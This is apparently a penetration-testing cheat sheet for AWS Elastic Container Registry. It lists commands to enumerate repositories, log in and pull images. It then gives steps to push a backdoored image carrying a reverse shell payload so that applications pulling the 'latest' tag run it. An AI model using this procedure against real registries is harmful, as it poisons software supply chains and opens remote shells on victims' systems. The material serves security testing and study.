# Elastic Container Registry (ECR)

A managed docker container registry service that allows users to store, manage, and deploy container images.

- `aws ecr describe-repositories --query 'repositories[].repositoryName' --output text --region <region>` - list all repositories
- `aws ecr describe-images --repository-name <repo> --region <region>` - list all docker images in a repo
- `docker login -u AWS -p $(aws ecr --profile <user_with_ecr_pull_privs> get-login-password --region <region>) <your-aws-account-id>.dkr.ecr.<region>.amazonaws.com` - log into ECR via docker

* Pull an image:
    - Log into ECR via docker (see above)
    - Pull the image: `docker pull <your-aws-account-id>.dkr.ecr.<region>.amazonaws.com/<repository-name>:latest`
    - Run the image: `docker run -d <your-aws-account-id>.dkr.ecr.<region>.amazonaws.com/<repository-name>:latest`

* Push a malicious image:
    - We use the `./backdoor-image` (and adjust the `./backdoor-image/rev.sh` reverse shell payload to our listener)
        - Start the corresponding listener
    - Log into ECR via docker (see above)
    - Build the docker image with the name of the `repository`: `docker build . -t <your-aws-account-id>.dkr.ecr.<region>.amazonaws.com>/<repository-name>:latest`
    - Push the image: `docker push <your-aws-account-id>.dkr.ecr.<region>.amazonaws.com>/<repository-name>:latest`
    - ... wait for an app to pull the latest image and run in ...